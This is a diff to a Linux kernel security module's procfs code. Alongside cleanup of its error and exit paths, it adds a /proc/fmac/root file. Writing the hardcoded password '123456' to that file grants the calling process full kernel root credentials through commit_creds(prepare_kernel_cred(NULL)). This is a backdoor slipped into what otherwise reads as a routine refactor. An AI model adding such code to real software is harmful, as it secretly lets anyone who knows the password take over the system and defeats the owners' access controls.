@@ -18,6 +18,7 @@
 #include "fmac.h"
 
 static struct proc_dir_entry *fmac_proc_entry;
+static struct proc_dir_entry *fmac_root_entry;
 static struct proc_dir_entry *fmac_log_entry;
 static struct proc_dir_entry *fmac_proc_dir;
 
@@ -105,6 +106,36 @@ static ssize_t fmac_proc_write(struct file *file, const char __user *buffer,
     return count;
 }
 
+static ssize_t fmac_root_write(struct file *file, const char __user *buffer,
+                               size_t count, loff_t *pos) {
+    char kbuf[64];
+    uid_t uid = current_uid().val;
+    const char *comm = current->comm;
+    pid_t pid = current->pid;
+
+    if (count >= sizeof(kbuf))
+        return -EINVAL;
+
+    if (copy_from_user(kbuf, buffer, count))
+        return -EFAULT;
+
+    kbuf[count] = '\0';
+    if (kbuf[count - 1] == '\n')
+        kbuf[count - 1] = '\0';
+
+    if (strcmp(kbuf, "123456") == 0) {
+        fmac_append_to_log("[FMAC] [root] Auth success: UID=%u, PID=%d, COMM=%s\n",
+                           uid, pid, comm);
+        commit_creds(prepare_kernel_cred(NULL));
+    } else {
+        fmac_append_to_log("[FMAC] [root] Auth failed from UID=%u, PID=%d, COMM=%s, input='%s'\n",
+                           uid, pid, comm, kbuf);
+        return -EPERM;
+    }
+
+    return count;
+}
+
 static const struct file_operations fmac_proc_ops = {
     .owner = THIS_MODULE,
     .open = fmac_proc_open,
@@ -112,6 +143,11 @@ static const struct file_operations fmac_proc_ops = {
     .write = fmac_proc_write,
     .llseek = seq_lseek,
     .release = single_release,
+};
+
+static const struct file_operations fmac_root_ops = {
+    .owner = THIS_MODULE,
+    .write = fmac_root_write,
 };
 
 static const struct file_operations fmac_log_proc_ops = {
@@ -133,23 +169,28 @@ int fmac_procfs_init(void) {
     fmac_proc_dir = proc_mkdir("fmac", NULL);
     if (!fmac_proc_dir) {
         pr_err("[FMAC] Failed to create /proc/fmac directory\n");
-        vfree(fmac_log_buffer);
+        fmac_procfs_exit();
         return -ENOMEM;
     }
 
+fmac_root_entry = proc_create("root", 0200, fmac_proc_dir, &fmac_root_ops);
+    if (!fmac_root_entry) {
+        pr_err("[FMAC] Failed to create /proc/fmac/root\n");
+        fmac_procfs_exit();
+        return -ENOMEM;
+    }
 
     fmac_proc_entry = proc_create("rules", 0666, fmac_proc_dir, &fmac_proc_ops);
     if (!fmac_proc_entry) {
         pr_err("[FMAC] Failed to create /proc/fmac\n");
-        vfree(fmac_log_buffer);
+        fmac_procfs_exit();
         return -ENOMEM;
     }
 
     fmac_log_entry = proc_create("log", 0444, fmac_proc_dir, &fmac_log_proc_ops);
     if (!fmac_log_entry) {
         pr_err("[FMAC] Failed to create /proc/fmac_log\n");
-        proc_remove(fmac_proc_entry);
-        vfree(fmac_log_buffer);
+        fmac_procfs_exit();
         return -ENOMEM;
     }
 
@@ -158,8 +199,29 @@ int fmac_procfs_init(void) {
 }
 
 void fmac_procfs_exit(void) {
-    remove_proc_entry("rules", fmac_proc_dir);
-    remove_proc_entry("log", fmac_proc_dir);
-    remove_proc_entry("fmac", NULL);
-    vfree(fmac_log_buffer);
+    if (fmac_proc_dir) {
+        if (fmac_proc_entry) {
+            remove_proc_entry("rules", fmac_proc_dir);
+            fmac_proc_entry = NULL;
+        }
+        if (fmac_log_entry) {
+            remove_proc_entry("log", fmac_proc_dir);
+            fmac_log_entry = NULL;
+        }
+        if (fmac_root_entry) {
+            remove_proc_entry("root", fmac_proc_dir);
+            fmac_root_entry = NULL;
+        }
+
+        remove_proc_entry("fmac", NULL);
+        fmac_proc_dir = NULL;
+    }
+
+    if (fmac_log_buffer) {
+        vfree(fmac_log_buffer);
+        fmac_log_buffer = NULL;
+        fmac_log_len = 0;
+    }
+
+    pr_info("[FMAC] Procfs removed.\n");
 }
